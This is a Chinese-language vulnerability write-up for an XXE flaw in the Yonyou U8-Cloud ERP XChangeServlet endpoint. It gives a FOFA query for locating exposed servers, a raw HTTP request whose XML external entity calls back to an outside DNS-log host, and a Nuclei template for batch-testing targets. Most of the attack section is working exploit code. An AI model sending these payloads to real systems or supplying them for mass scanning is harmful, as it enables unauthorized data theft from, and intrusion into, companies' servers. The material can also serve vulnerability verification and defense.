**漏洞名称**

用友U8-Cloud XChangeServlet XXE漏洞

**漏洞影响**

用友U8-Cloud 版本不详

**漏洞描述**

用友U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。该系统/service/XChangeServlet接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器数据泄露以及被远控。

**FOFA搜索语句**

app="用友-U8-Cloud"

**漏洞复现**

借助http://dnslog.pw/dns/进行复现

```yaml
POST /service/XChangeServlet HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Content-Type: text/xml
Connection: close
 
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://farr9frh.dnslog.pw">]><r><a>&xxe;</a ></r>
```

批量

```yaml

id: yonyou-u8-cloud-XChangeServlet-xxe

info:
  name: 用友U8-Cloud XChangeServlet XXE漏洞
  author: fgz
  severity: critical
  description: 用友U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。该系统/service/XChangeServlet接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器数据泄露以及被远控。
  metadata:
    max-request: 1
    fofa-query: app="用友-U8-Cloud"
    verified: true
requests:
  - raw:
      - |+
        POST /service/XChangeServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
        Content-Type: text/xml
        Connection: close
        
        <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]><r><a>&xxe;</a ></r>
        

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and
```

